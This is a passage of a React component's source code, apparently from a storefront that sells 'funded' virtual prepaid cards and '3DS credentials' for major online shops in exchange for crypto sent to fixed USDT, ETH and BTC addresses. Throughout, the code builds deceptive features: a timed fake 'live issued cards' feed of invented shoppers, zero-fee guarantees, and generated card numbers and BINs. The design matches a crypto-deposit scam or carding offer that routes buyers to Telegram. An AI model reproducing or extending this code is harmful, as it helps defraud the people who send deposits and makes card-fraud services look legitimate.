import React, { useState, useMemo, useEffect } from 'react';
import { 
  CreditCard, 
  ShoppingBag, 
  Sparkles, 
  Copy, 
  Check, 
  Send, 
  ShieldCheck, 
  Gift, 
  Tag, 
  Zap, 
  Lock, 
  RefreshCw, 
  CheckCircle2, 
  Globe, 
  Activity,
  Coins,
  AlertTriangle,
  ArrowRight,
  Sliders,
  DollarSign
} from 'lucide-react';
import { soundManager } from '../utils/audio';

interface ShoppingCardBannerProps {
  onOpenTelegram: (msg?: string) => void;
  incrementClicks: () => void;
}

type CardNetwork = 'visa' | 'mastercard' | 'amex' | 'discover';
type CryptoAsset = 'USDT' | 'ETH' | 'BTC';

interface CryptoDepositInfo {
  asset: CryptoAsset;
  name: string;
  network: string;
  address: string;
  icon: string;
  notes: string;
}

const CRYPTO_DEPOSIT_ADDRESSES: Record<CryptoAsset, CryptoDepositInfo> = {
  USDT: {
    asset: 'USDT',
    name: 'Tether USD',
    network: 'TRC20 (Tron Network)',
    address: 'TMmpdCUFH9xJ5efivRdyAw8MBVGqdsJmpX',
    icon: '⚡',
    notes: 'Send USDT via TRC20 network for ultra-low network gas fee and ~60s automated ledger confirmation.',
  },
  ETH: {
    asset: 'ETH',
    name: 'Ethereum',
    network: 'ERC20 / Arbitrum / Optimism',
    address: '0x450306b9721d2cc03a70f3c6aa9b7a61b0137b44',
    icon: '💎',
    notes: 'Deposits via smart contracts are not supported with the exception of ETH via ERC20, Arbitrum & Optimism network or BNB via BSC network.',
  },
  BTC: {
    asset: 'BTC',
    name: 'Bitcoin',
    network: 'BTC Native Network',
    address: '15512yaegwoVpZ2mjnsZ8mmVdhMnbcYybZ',
    icon: '🪙',
    notes: 'Binance supports deposits from all BTC addresses (starting with "1", "3", "bc1p" and "bc1q")',
  },
};

interface VirtualCardInfo {
  network: CardNetwork;
  brandName: string;
  cardDisplay: string;
  cardHolder: string;
  expiry: string;
  cvv: string;
  balance: number;
  promoCode: string;
  accentGradient: string;
  cardColor: string;
  borderColor: string;
}

interface LiveIssuanceEntry {
  id: string;
  user: string;
  amount: string;
  store: string;
  time: string;
}

// Standard prepaid virtual card templates by network
const NETWORK_CONFIGS: Record<CardNetwork, { prefix: string; brand: string; gradient: string; border: string }> = {
  visa: {
    prefix: '4532',
    brand: 'VISA PREPAID PLATINUM',
    gradient: 'from-[#0d2352] via-[#1a365d] to-[#0a192f]',
    border: 'border-blue-400/80',
  },
  mastercard: {
    prefix: '5399',
    brand: 'MASTERCARD VIRTUAL WORLD',
    gradient: 'from-[#2b0a0a] via-[#1a1111] to-[#0a0505]',
    border: 'border-orange-500/80',
  },
  amex: {
    prefix: '3774',
    brand: 'AMEX CENTURION PREPAID',
    gradient: 'from-[#063940] via-[#195e63] to-[#0d2a2d]',
    border: 'border-cyan-400/80',
  },
  discover: {
    prefix: '6011',
    brand: 'DISCOVER CASHBACK ELITE',
    gradient: 'from-[#3b1d05] via-[#4d280c] to-[#1c0c02]',
    border: 'border-amber-500/80',
  },
};

const STORE_DISCOUNTS = [
  { store: 'Amazon Global Mall', discount: '30% Cash Rebate', code: 'AMZ-PRIME-2500', tag: 'Zero FX Fees' },
  { store: 'AliExpress Luxury', discount: '$350 Credit', code: 'ALI-GLOBAL-VIP', tag: 'Direct Delivery' },
  { store: 'eBay Vault & Collectibles', discount: '25% Voucher', code: 'EBAY-VAULT-2500', tag: 'Verified Deals' },
  { store: 'Shein & ASOS Designer', discount: '$250 Spree', code: 'FASHION-VIP-PRO', tag: 'Free Express' },
];

const SHOPPERS_POOL = [
  '@Alex_Shopper', '@Chloe_Deals', '@David_Prime', '@Sophie_Cart', 
  '@Marcus_Deals', '@Elena_Amazon', '@Tariq_Global', '@Hannah_ASOS', 
  '@Lucas_eBay', '@Amara_AliExp', '@Oliver_Spree', '@Kenji_Shop'
];

const ISSUED_AMOUNTS_POOL = [
  { amount: '$300 Visa', store: 'Amazon' },
  { amount: '$500 MC', store: 'AliExpress' },
  { amount: '$1,000 AMEX', store: 'eBay' },
  { amount: '$2,500 Visa', store: 'Shein' },
  { amount: '$5,000 MC', store: 'ASOS' },
  { amount: '$10,000 AMEX', store: 'Amazon Prime' },
];

const INITIAL_ISSUANCES: LiveIssuanceEntry[] = [
  { id: '1', user: '@Alex_Shopper', amount: '$300 Visa', store: 'Amazon', time: 'Just now' },
  { id: '2', user: '@Chloe_Deals', amount: '$500 MC', store: 'AliExpress', time: '18s ago' },
  { id: '3', user: '@David_Prime', amount: '$1,000 AMEX', store: 'eBay', time: '45s ago' },
];

export const ShoppingCardBanner: React.FC<ShoppingCardBannerProps> = ({
  onOpenTelegram,
  incrementClicks,
}) => {
  const [selectedNetwork, setSelectedNetwork] = useState<CardNetwork>('visa');
  const [cardHolder, setCardHolder] = useState<string>('VIP SHOPPER');
  const [voucherAmount, setVoucherAmount] = useState<number>(300);
  const [customAmountInput, setCustomAmountInput] = useState<string>('300');
  const [selectedCrypto, setSelectedCrypto] = useState<CryptoAsset>('USDT');
  const [copiedField, setCopiedField] = useState<string | null>(null);
  const [seed, setSeed] = useState<number>(1088);
  const [isGenerating, setIsGenerating] = useState<boolean>(false);
  const [liveIssuances, setLiveIssuances] = useState<LiveIssuanceEntry[]>(INITIAL_ISSUANCES);

  // Zero Processing Fee Calculations (100% Direct Spendable Balance)
  const feeRatePercent = 0;
  const processingFee = 0;
  const totalPayable = voucherAmount;

  // Format currency
  const formatUSD = (val: number) => {
    return new Intl.NumberFormat('en-US', {
      style: 'currency',
      currency: 'USD',
      minimumFractionDigits: 2,
    }).format(val);
  };

  // Dynamic live issuances rotating stream
  useEffect(() => {
    const interval = setInterval(() => {
      const randomUser = SHOPPERS_POOL[Math.floor(Math.random() * SHOPPERS_POOL.length)];
      const randomItem = ISSUED_AMOUNTS_POOL[Math.floor(Math.random() * ISSUED_AMOUNTS_POOL.length)];

      const newEntry: LiveIssuanceEntry = {
        id: String(Date.now()),
        user: randomUser,
        amount: randomItem.amount,
        store: randomItem.store,
        time: 'Just now',
      };

      setLiveIssuances((prev) => {
        const updated = prev.slice(0, 2).map((item, idx) => ({
          ...item,
          time: idx === 0 ? '12s ago' : '38s ago',
        }));
        return [newEntry, ...updated];
      });
    }, 3500);

    return () => clearInterval(interval);
  }, []);

  // Generate dynamic preview representation
  const currentCard: VirtualCardInfo = useMemo(() => {
    const config = NETWORK_CONFIGS[selectedNetwork];
    
    let num = config.prefix;
    if (selectedNetwork === 'visa') {
      num = `4532 •••• •••• ${String((seed * 73) % 9000 + 1000)}`;
    } else if (selectedNetwork === 'mastercard') {
      num = `5399 •••• •••• ${String((seed * 37) % 9000 + 1000)}`;
    } else if (selectedNetwork === 'amex') {
      num = `3774 •••••• •${String((seed * 51) % 9000 + 1000)}`;
    } else {
      num = `6011 •••• •••• ${String((seed * 29) % 9000 + 1000)}`;
    }

    const expMonth = String(((seed % 12) + 1)).padStart(2, '0');
    const expYear = String(28 + (seed % 3));
    const cvv = '•••';
    const promoCode = `VIP-3DS-${selectedNetwork.toUpperCase().slice(0, 4)}-${voucherAmount}`;

    return {
      network: selectedNetwork,
      brandName: config.brand,
      cardDisplay: num,
      cardHolder: cardHolder.toUpperCase() || 'VIP SHOPPER',
      expiry: `${expMonth}/${expYear}`,
      cvv,
      balance: voucherAmount,
      promoCode,
      accentGradient: config.gradient,
      cardColor: '#ffffff',
      borderColor: config.border,
    };
  }, [selectedNetwork, cardHolder, voucherAmount, seed]);

  const handleCopy = (text: string, fieldName: string) => {
    navigator.clipboard.writeText(text);
    setCopiedField(fieldName);
    soundManager.playCoin();
    setTimeout(() => setCopiedField(null), 2000);
  };

  const handleNewCardPreview = () => {
    setIsGenerating(true);
    soundManager.playSpinTick();
    setSeed((prev) => prev + Math.floor(Math.random() * 89) + 11);
    setTimeout(() => {
      setIsGenerating(false);
      soundManager.playCoin();
    }, 250);
  };

  const handleSelectAmount = (amt: number) => {
    setVoucherAmount(amt);
    setCustomAmountInput(String(amt));
    soundManager.playSpinTick();
  };

  const handleCustomAmountChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const raw = e.target.value.replace(/[^0-9]/g, '');
    setCustomAmountInput(raw);
    const num = parseInt(raw, 10);
    if (!isNaN(num)) {
      if (num >= 300) {
        setVoucherAmount(num);
      } else {
        setVoucherAmount(300);
      }
    }
  };

  const handleClaimTelegram = () => {
    incrementClicks();
    soundManager.playWinFanfare();

    const activeCrypto = CRYPTO_DEPOSIT_ADDRESSES[selectedCrypto];
    const feeFormatted = formatUSD(processingFee);
    const balanceFormatted = formatUSD(voucherAmount);

    // Save order details to MongoDB Adkings database
    try {
      fetch('/api/orders', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          orderType: 'virtual_card',
          amount: voucherAmount,
          feeAmount: 0,
          feePercentage: 0,
          totalPayable: voucherAmount,
          currency: 'USD',
          paymentMethod: 'crypto',
          depositAsset: activeCrypto.asset,
          depositNetwork: activeCrypto.network,
          depositAddress: activeCrypto.address,
          targetDetails: {
            brandName: currentCard.brandName,
            cardHolder: currentCard.cardHolder,
            cardNetwork: selectedNetwork,
            promoCode: currentCard.promoCode,
            storeTarget: 'Amazon, AliExpress, eBay, ASOS, Shein & Global 3DS E-Commerce',
          },
        }),
      }).catch((e) => console.warn('Order logging to Adkings error:', e));
    } catch (e) {
      // Non-blocking
    }

    const msg = 
      `🛍️ VIRTUAL SHOPPING PREPAID CARD & VOUCHER APPLICATION:\n` +
      `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
      `• Card Brand: ${currentCard.brandName}\n` +
      `• Virtual Card Balance You Receive: ${balanceFormatted} USDT\n` +
      `• Processing Fee: $0.00 (Zero Fee)\n` +
      `• Total Amount Payable: ${balanceFormatted} USDT\n` +
      `• Cardholder Alias: ${currentCard.cardHolder}\n` +
      `• 3DS Promo Voucher: ${currentCard.promoCode}\n` +
      `• Selected Payment Crypto: ${activeCrypto.asset} (${activeCrypto.network})\n` +
      `• Deposit Address: ${activeCrypto.address}\n` +
      `• Target Stores: Amazon, AliExpress, eBay, ASOS, Shein & Global 3DS E-Commerce\n` +
      `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
      `I am ready to order my ${balanceFormatted} Virtual Card credentials!`;
    
    onOpenTelegram(msg);
  };

  return (
    <div className="relative overflow-hidden rounded-3xl bg-gradient-to-br from-[#1a052e] via-[#0f041d] to-black border-2 border-purple-500/80 p-4 sm:p-6 shadow-[0_0_40px_rgba(168,85,247,0.35)] glow-gold">
      
      {/* Top Banner Bar */}
      <div className="flex flex-col lg:flex-row items-start lg:items-center justify-between gap-3 border-b border-purple-500/30 pb-3.5 mb-4">
        <div className="space-y-1">
          <div className="flex items-center gap-2 flex-wrap">
            <span className="bg-gradient-to-r from-purple-500 via-pink-500 to-rose-500 text-white font-black text-xs sm:text-sm px-3 py-1 rounded-full uppercase tracking-wider shadow-[0_0_12px_rgba(168,85,247,0.6)] flex items-center gap-1.5 animate-pulse">
              <ShoppingBag className="w-4 h-4 inline text-yellow-300" /> Virtual Prepaid Shopping Cards & Store Vouchers
            </span>
            <span className="bg-emerald-400 text-black font-black text-[10px] sm:text-xs px-2.5 py-0.5 rounded uppercase tracking-tight flex items-center gap-1 shadow-sm">
              <CheckCircle2 className="w-3.5 h-3.5 text-black inline" /> Instant Digital Issuance
            </span>
            <span className="bg-gradient-to-r from-emerald-600 to-teal-600 text-white font-black text-[10px] sm:text-xs px-2.5 py-0.5 rounded uppercase tracking-tight border border-emerald-300 shadow-[0_0_10px_rgba(16,185,129,0.5)]">
              ZERO PROCESSING FEE • 100% INSTANT VALUE • 3D SECURE
            </span>
          </div>
          <p className="text-xs text-zinc-300 font-medium pt-1 max-w-3xl leading-relaxed">
            Funded virtual prepaid cards and e-commerce shopping promo vouchers for <strong className="text-white">Amazon, AliExpress, eBay, ASOS</strong> and international merchants with 3D Secure zero-friction online checkout. Min load: <strong className="text-yellow-300 font-bold">300 USD</strong> with <strong className="text-emerald-400 font-bold">0% processing fee</strong> (Zero-Fee Card Issuance).
          </p>
        </div>

        {/* Status indicator */}
        <div className="flex items-center gap-2 bg-black/60 border border-purple-500/40 px-3 py-1.5 rounded-xl text-xs shrink-0 w-full lg:w-auto justify-between lg:justify-start">
          <div className="flex items-center gap-2.5 font-mono text-[11px]">
            <div className="flex items-center gap-1 text-pink-400 font-bold">
              <Sparkles className="w-3.5 h-3.5 text-yellow-400" />
              <span>Min 300 USD</span>
            </div>
            <span className="text-zinc-600">•</span>
            <div className="flex items-center gap-1 text-emerald-400 font-bold">
              <CheckCircle2 className="w-3.5 h-3.5 text-emerald-400" />
              <span>0% Processing Fee</span>
            </div>
            <span className="text-zinc-600">•</span>
            <div className="flex items-center gap-1 text-emerald-400 font-bold">
              <Zap className="w-3.5 h-3.5 text-emerald-400" />
              <span>Instant Issuance</span>
            </div>
          </div>
        </div>
      </div>

      {/* 4-Step Virtual Card Issuance Process Banner */}
      <div className="bg-[#120421] border border-purple-500/40 rounded-2xl p-3 sm:p-4 mb-5 shadow-inner">
        <div className="flex items-center justify-between mb-2">
          <span className="text-xs font-black text-pink-300 uppercase tracking-wider flex items-center gap-1.5">
            <CheckCircle2 className="w-4 h-4 text-emerald-400" />
            Virtual Card Issuance Process:
          </span>
          <span className="text-[11px] font-mono text-emerald-400 font-bold">
            Zero Fee ➔ Receive 100% Full Face Value ({formatUSD(voucherAmount)})
          </span>
        </div>

        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-2 text-xs">
          <div className="bg-black/60 border border-purple-500/30 rounded-xl p-2.5 flex items-center gap-2.5">
            <div className="w-6 h-6 rounded-full bg-purple-600 text-white font-black text-xs flex items-center justify-center shrink-0 shadow-[0_0_8px_rgba(168,85,247,0.6)]">
              1
            </div>
            <div>
              <span className="text-[10px] text-zinc-400 block font-bold">Step 1</span>
              <span className="text-white font-bold text-xs">Configure Network & Name</span>
            </div>
          </div>

          <div className="bg-black/60 border border-emerald-500/40 rounded-xl p-2.5 flex items-center gap-2.5 bg-emerald-950/20">
            <div className="w-6 h-6 rounded-full bg-emerald-500 text-black font-black text-xs flex items-center justify-center shrink-0 shadow-[0_0_8px_rgba(16,185,129,0.6)]">
              2
            </div>
            <div>
              <span className="text-[10px] text-emerald-300 block font-bold">Step 2: Zero Processing Fee</span>
              <span className="text-white font-bold text-xs">Send Card Value Deposit</span>
            </div>
          </div>

          <div className="bg-black/60 border border-purple-500/30 rounded-xl p-2.5 flex items-center gap-2.5">
            <div className="w-6 h-6 rounded-full bg-pink-500 text-white font-black text-xs flex items-center justify-center shrink-0 shadow-[0_0_8px_rgba(236,72,153,0.6)]">
              3
            </div>
            <div>
              <span className="text-[10px] text-zinc-400 block font-bold">Step 3</span>
              <span className="text-white font-bold text-xs">Automated 3DS Credentials</span>
            </div>
          </div>

          <div className="bg-black/60 border border-emerald-500/40 rounded-xl p-2.5 flex items-center gap-2.5 bg-emerald-950/20">
            <div className="w-6 h-6 rounded-full bg-emerald-500 text-black font-black text-xs flex items-center justify-center shrink-0 shadow-[0_0_8px_rgba(16,185,129,0.6)]">
              4
            </div>
            <div>
              <span className="text-[10px] text-emerald-400 block font-bold">Step 4: Card Delivered</span>
              <span className="text-emerald-300 font-black text-xs">{formatUSD(voucherAmount)} Spendable Limit</span>
            </div>
          </div>
        </div>
      </div>

      {/* Main Grid: Visual Virtual Card (Left) + Interactive Card Controls, Payment Addresses & Invoice (Right) */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-5 items-stretch">
        
        {/* Left Column: Visual Realistic Card Display (5 cols) */}
        <div className="lg:col-span-5 flex flex-col justify-between space-y-3">
          
          {/* Card Brand Network Selector Pills */}
          <div className="grid grid-cols-4 gap-1.5">
            {(['visa', 'mastercard', 'amex', 'discover'] as CardNetwork[]).map((net) => {
              const active = selectedNetwork === net;
              return (
                <button
                  key={net}
                  onClick={() => {
                    setSelectedNetwork(net);
                    soundManager.playSpinTick();
                  }}
                  className={`py-1.5 px-1 rounded-xl text-[10px] font-black uppercase transition-all flex flex-col items-center justify-center border ${
                    active
                      ? 'bg-gradient-to-r from-purple-600 to-pink-500 text-white border-pink-300 shadow-[0_0_12px_rgba(217,70,239,0.5)] scale-105'
                      : 'bg-zinc-900/90 text-zinc-400 hover:text-white border-zinc-800'
                  }`}
                >
                  <span>{net === 'mastercard' ? 'Master' : net === 'discover' ? 'Disc' : net.toUpperCase()}</span>
                </button>
              );
            })}
          </div>

          {/* Realistic Virtual Credit Card Surface */}
          <div 
            className={`relative overflow-hidden rounded-2xl p-5 bg-gradient-to-br ${currentCard.accentGradient} border-2 ${currentCard.borderColor} shadow-[0_15px_30px_rgba(0,0,0,0.8)] text-white space-y-4 transition-all duration-300 transform ${isGenerating ? 'scale-95 opacity-80' : 'scale-100 opacity-100'}`}
          >
            {/* Holographic Watermark & Circuit Accents */}
            <div className="absolute -right-8 -bottom-8 w-44 h-44 rounded-full bg-white/5 blur-xl pointer-events-none" />
            <div className="absolute top-2 right-3 text-[9px] font-mono text-white/50 tracking-widest uppercase flex items-center gap-1">
              <Lock className="w-2.5 h-2.5 text-emerald-400 inline" /> 3DS PREPAID SECURE
            </div>

            {/* Top Card Row: EMV Chip + Contactless + Brand */}
            <div className="flex items-center justify-between pt-1">
              <div className="flex items-center gap-2.5">
                {/* Gold EMV Chip Graphic */}
                <div className="w-10 h-7 rounded-md bg-gradient-to-tr from-amber-400 via-yellow-200 to-amber-500 border border-yellow-300 shadow-inner flex items-center justify-center">
                  <div className="w-6 h-4 border border-amber-600/40 rounded-sm grid grid-cols-2 gap-0.5 opacity-60">
                    <div className="border-r border-amber-700/40"></div>
                    <div></div>
                  </div>
                </div>
                {/* Contactless Icon */}
                <div className="text-white/70 font-bold text-xs tracking-tighter">
                  <Zap className="w-4 h-4 text-white/80" />
                </div>
              </div>

              {/* Card Brand Logo */}
              <div className="text-right">
                {selectedNetwork === 'visa' && (
                  <span className="font-black italic text-lg sm:text-xl tracking-wider text-blue-200 drop-shadow-[0_2px_4px_rgba(0,0,0,0.8)]">
                    VISA
                  </span>
                )}
                {selectedNetwork === 'mastercard' && (
                  <div className="flex items-center -space-x-2">
                    <div className="w-6 h-6 rounded-full bg-red-600 opacity-90 shadow"></div>
                    <div className="w-6 h-6 rounded-full bg-amber-500 opacity-90 shadow"></div>
                  </div>
                )}
                {selectedNetwork === 'amex' && (
                  <span className="font-black text-xs sm:text-sm tracking-tighter bg-cyan-200 text-slate-900 px-2 py-0.5 rounded font-mono">
                    AMEX
                  </span>
                )}
                {selectedNetwork === 'discover' && (
                  <span className="font-black text-xs sm:text-sm tracking-wider text-amber-400 font-sans">
                    DISCOVER
                  </span>
                )}
              </div>
            </div>

            {/* Card Number Masked */}
            <div className="pt-2">
              <span className="text-[9px] text-white/60 font-mono uppercase tracking-wider block mb-0.5">Virtual Card Number:</span>
              <div className="font-mono text-base sm:text-lg font-black tracking-widest text-white drop-shadow-[0_2px_4px_rgba(0,0,0,0.9)] flex items-center justify-between">
                <span>{currentCard.cardDisplay}</span>
                <span className="text-[10px] font-sans text-emerald-400 bg-emerald-950/80 border border-emerald-500/40 px-2 py-0.5 rounded-full font-bold">
                  Funded
                </span>
              </div>
            </div>

            {/* Cardholder, Expiry & CVV */}
            <div className="grid grid-cols-3 gap-2 pt-1 border-t border-white/10 text-xs">
              <div>
                <span className="text-[8px] text-white/50 font-mono uppercase block">Cardholder</span>
                <span className="font-mono font-bold text-[11px] truncate block text-white/90">
                  {currentCard.cardHolder}
                </span>
              </div>
              <div>
                <span className="text-[8px] text-white/50 font-mono uppercase block">Expires</span>
                <span className="font-mono font-bold text-[11px] text-white/90">
                  {currentCard.expiry}
                </span>
              </div>
              <div className="text-right">
                <span className="text-[8px] text-white/50 font-mono uppercase block">CVV / CVC</span>
                <span className="font-mono font-bold text-[11px] text-yellow-300">
                  {currentCard.cvv}
                </span>
              </div>
            </div>

            {/* Shopping Credit Balance Ribbon */}
            <div className="bg-black/60 border border-white/10 rounded-xl p-2 flex items-center justify-between text-xs">
              <span className="text-zinc-300 text-[10px] font-bold flex items-center gap-1">
                <Gift className="w-3.5 h-3.5 text-pink-400" /> Loaded Card Balance:
              </span>
              <span className="text-emerald-400 font-mono font-black text-sm glow-gold">
                {formatUSD(voucherAmount)} USDT
              </span>
            </div>

          </div>

          {/* Quick Switch Card Style / Network */}
          <button
            onClick={handleNewCardPreview}
            disabled={isGenerating}
            className="w-full py-2 bg-purple-950/60 hover:bg-purple-900/80 text-purple-200 border border-purple-500/40 rounded-xl text-xs font-black flex items-center justify-center gap-1.5 transition-all shadow"
          >
            <RefreshCw className={`w-3.5 h-3.5 text-pink-400 ${isGenerating ? 'animate-spin' : ''}`} />
            <span>Generate Next Card Identifier & Bin</span>
          </button>

          {/* Recent Live Issuance Stream */}
          <div className="bg-black/50 border border-purple-500/20 rounded-xl p-2 space-y-1">
            <span className="text-[10px] font-bold text-zinc-400 flex items-center gap-1">
              <Activity className="w-3 h-3 text-emerald-400 animate-pulse" /> Live Issued Cards:
            </span>
            <div className="flex items-center justify-between text-[10px] font-mono text-zinc-300">
              {liveIssuances.map((item) => (
                <div key={item.id} className="flex items-center gap-1">
                  <span className="text-pink-300 font-bold">{item.user}</span>
                  <span className="text-emerald-400">({item.amount})</span>
                </div>
              ))}
            </div>
          </div>

        </div>

        {/* Right Column: Customization, Official Deposit Addresses & Claim (7 cols) */}
        <div className="lg:col-span-7 bg-[#140622]/90 border border-purple-500/40 rounded-2xl p-4 sm:p-5 flex flex-col justify-between space-y-4">
          
          <div className="space-y-4">
            
            {/* Header / Customizer */}
            <div className="flex items-center justify-between border-b border-purple-500/20 pb-2">
              <span className="text-xs font-black text-pink-300 uppercase tracking-wide flex items-center gap-1.5">
                <Sliders className="w-3.5 h-3.5 text-yellow-400" />
                Configure Card Balance (Min: 300 USD)
              </span>
              <span className="text-[11px] font-mono text-emerald-400 font-bold flex items-center gap-1">
                <CheckCircle2 className="w-3 h-3 text-emerald-400" /> 100% Usable Worldwide
              </span>
            </div>

            {/* Configurable Amount Buttons & Custom Amount Input */}
            <div className="space-y-2">
              <div className="flex items-center justify-between text-xs font-bold text-zinc-300">
                <span>Select or Type Loaded Card Balance:</span>
                <span className="text-emerald-400 font-mono font-black text-sm">
                  {formatUSD(voucherAmount)} USDT
                </span>
              </div>

              {/* Quick Preset Buttons (Min 300 USD) */}
              <div className="grid grid-cols-5 gap-1.5">
                {[300, 500, 1000, 2500, 5000].map((amt) => (
                  <button
                    key={amt}
                    onClick={() => handleSelectAmount(amt)}
                    className={`py-1.5 rounded-xl text-xs font-mono font-black transition-all border ${
                      voucherAmount === amt
                        ? 'bg-gradient-to-r from-pink-500 to-purple-600 text-white border-pink-300 shadow-[0_0_10px_rgba(236,72,153,0.5)] scale-[1.02]'
                        : 'bg-black/60 text-zinc-400 hover:text-white border-zinc-800'
                    }`}
                  >
                    ${amt.toLocaleString()}
                  </button>
                ))}
              </div>

              {/* Custom Input & Range Slider */}
              <div className="bg-black/70 p-2.5 rounded-xl border border-purple-500/30 space-y-2">
                <div className="flex items-center justify-between gap-2 text-xs">
                  <span className="text-zinc-400 font-medium">Custom Amount (USDT):</span>
                  <div className="relative w-36">
                    <span className="absolute left-2.5 top-1.5 text-zinc-400 font-mono">$</span>
                    <input
                      type="text"
                      value={customAmountInput}
                      onChange={handleCustomAmountChange}
                      placeholder="300"
                      className="w-full bg-zinc-950 border border-purple-500/40 rounded-lg pl-6 pr-2 py-1 text-xs font-mono font-black text-yellow-300 focus:outline-none focus:border-pink-400"
                    />
                  </div>
                </div>
                <input
                  type="range"
                  min="300"
                  max="25000"
                  step="100"
                  value={voucherAmount}
                  onChange={(e) => handleSelectAmount(Number(e.target.value))}
                  className="w-full accent-pink-500 cursor-pointer h-1.5 bg-zinc-800 rounded-lg"
                />
                <div className="flex justify-between text-[10px] text-zinc-400 font-mono">
                  <span>Min: 300 USD</span>
                  <span>Max: 25,000+ USDT</span>
                </div>
              </div>
            </div>

            {/* Zero Processing Fee Guarantee Banner */}
            <div className="bg-gradient-to-r from-emerald-950/40 via-purple-950/40 to-teal-950/30 border border-emerald-500/50 rounded-xl p-3 space-y-2 text-xs shadow-md">
              <div className="flex items-center justify-between font-bold">
                <span className="text-emerald-300 flex items-center gap-1.5 font-black text-xs sm:text-sm">
                  <CheckCircle2 className="w-4 h-4 text-emerald-400 shrink-0" />
                  0% PROCESSING FEE GUARANTEED • 1:1 DIRECT CARD ISSUANCE
                </span>
                <span className="bg-emerald-500 text-black font-black font-mono text-[11px] px-2 py-0.5 rounded">
                  0% Processing Fee
                </span>
              </div>
              <p className="text-[11px] text-zinc-300 leading-normal">
                Pay <strong className="text-emerald-300 font-bold">zero processing fees ($0.00)</strong>. 100% of your deposit is credited directly to your spendable virtual card with 3D Secure authentication and full global merchant acceptance.
              </p>
              <div className="grid grid-cols-2 gap-2 pt-1.5 border-t border-purple-500/30 text-xs font-mono">
                <div className="bg-black/60 p-1.5 rounded-lg border border-emerald-500/30">
                  <span className="text-zinc-400 block text-[10px]">Processing Fee:</span>
                  <span className="text-emerald-300 font-black text-sm">$0.00 (0% Free)</span>
                </div>
                <div className="bg-black/60 p-1.5 rounded-lg border border-emerald-500/30">
                  <span className="text-zinc-400 block text-[10px]">You Receive (Loaded Card):</span>
                  <span className="text-emerald-400 font-black text-sm">{formatUSD(voucherAmount)} USDT</span>
                </div>
              </div>
            </div>

            {/* Custom Cardholder Name Input */}
            <div>
              <label className="text-xs font-bold text-zinc-300 block mb-1">
                Preferred Cardholder Name / Alias:
              </label>
              <input
                type="text"
                value={cardHolder}
                onChange={(e) => setCardHolder(e.target.value)}
                placeholder="YOUR NAME OR VIP SHOPPER"
                className="w-full bg-black/80 border border-purple-500/30 rounded-xl px-3 py-2 text-xs font-mono text-white placeholder-zinc-500 focus:outline-none focus:border-pink-400 uppercase"
              />
            </div>

            {/* Official Payment Deposit Addresses with 1-Click Copy */}
            <div className="bg-[#0e031a] border border-purple-500/40 rounded-xl p-3 space-y-2.5">
              <div className="flex items-center justify-between">
                <span className="text-xs font-black text-yellow-300 uppercase tracking-wide flex items-center gap-1.5">
                  <Coins className="w-3.5 h-3.5 text-yellow-400" />
                  Official Deposit Addresses (Payable: {formatUSD(voucherAmount)} - Zero Processing Fee):
                </span>
                <span className="text-[10px] text-zinc-400 font-mono">One-Click Copy</span>
              </div>

              {/* Crypto Selector Tabs: USDT, ETH, BTC */}
              <div className="grid grid-cols-3 gap-1.5">
                {(['USDT', 'ETH', 'BTC'] as CryptoAsset[]).map((asset) => {
                  const info = CRYPTO_DEPOSIT_ADDRESSES[asset];
                  const isSelected = selectedCrypto === asset;
                  return (
                    <button
                      key={asset}
                      onClick={() => {
                        setSelectedCrypto(asset);
                        soundManager.playSpinTick();
                      }}
                      className={`py-1.5 px-2 rounded-lg text-xs font-black transition-all flex items-center justify-center gap-1 border ${
                        isSelected
                          ? 'bg-gradient-to-r from-pink-600 via-purple-600 to-indigo-600 text-white border-yellow-300 shadow-[0_0_10px_rgba(234,179,8,0.5)] scale-[1.02]'
                          : 'bg-zinc-900/90 text-zinc-400 hover:text-white border-zinc-800'
                      }`}
                    >
                      <span>{info.icon}</span>
                      <span>{asset}</span>
                    </button>
                  );
                })}
              </div>

              {/* Active Payment Address Card */}
              {(() => {
                const active = CRYPTO_DEPOSIT_ADDRESSES[selectedCrypto];
                return (
                  <div className="bg-black/80 border border-purple-500/30 rounded-xl p-2.5 space-y-2">
                    <div className="flex items-center justify-between text-xs">
                      <div className="flex items-center gap-1.5">
                        <span className="text-base">{active.icon}</span>
                        <strong className="text-white">{active.name} ({active.asset})</strong>
                        <span className="text-[10px] text-pink-400 font-mono bg-purple-950 px-1.5 py-0.2 rounded border border-purple-500/30">
                          {active.network}
                        </span>
                      </div>
                      <span className="text-[10px] text-emerald-400 font-mono font-bold">Active Gateway</span>
                    </div>

                    {/* Address Box with Copy Button */}
                    <div className="flex items-center justify-between gap-2 bg-zinc-950 p-2 rounded-lg border border-zinc-800">
                      <span className="font-mono text-[11px] sm:text-xs text-yellow-300 font-bold break-all select-all">
                        {active.address}
                      </span>
                      <button
                        onClick={() => handleCopy(active.address, active.asset)}
                        className="px-2.5 py-1.5 bg-purple-600 hover:bg-purple-500 text-white font-black text-[10px] sm:text-xs rounded-lg border border-purple-400 shrink-0 flex items-center gap-1 transition-all active:scale-95 shadow-sm"
                        title="Copy Deposit Address"
                      >
                        {copiedField === active.asset ? (
                          <>
                            <Check className="w-3 h-3 text-emerald-300" />
                            <span className="text-emerald-300">Copied!</span>
                          </>
                        ) : (
                          <>
                            <Copy className="w-3 h-3" />
                            <span>Copy</span>
                          </>
                        )}
                      </button>
                    </div>

                    {/* Specific Network Guidelines */}
                    <div className="text-[10px] text-zinc-300 leading-tight bg-purple-950/40 p-2 rounded border border-purple-500/20 space-y-1">
                      <p className="font-medium text-pink-200">
                        • {active.notes}
                      </p>
                    </div>
                  </div>
                );
              })()}

              {/* Critical Security Warnings */}
              <div className="bg-red-950/40 border border-red-500/40 p-2.5 rounded-xl text-[10px] sm:text-[11px] text-red-200 space-y-1">
                <div className="flex items-center gap-1 font-bold text-red-300">
                  <AlertTriangle className="w-3.5 h-3.5 text-red-400 shrink-0" />
                  Important Deposit Safety Warnings:
                </div>
                <p className="text-[10px] text-zinc-300 leading-snug">
                  1. <strong className="text-white">Smart Contracts:</strong> Deposits via smart contracts are not supported with the exception of ETH via ERC20, Arbitrum & Optimism network or BNB via BSC network.
                </p>
                <p className="text-[10px] text-zinc-300 leading-snug">
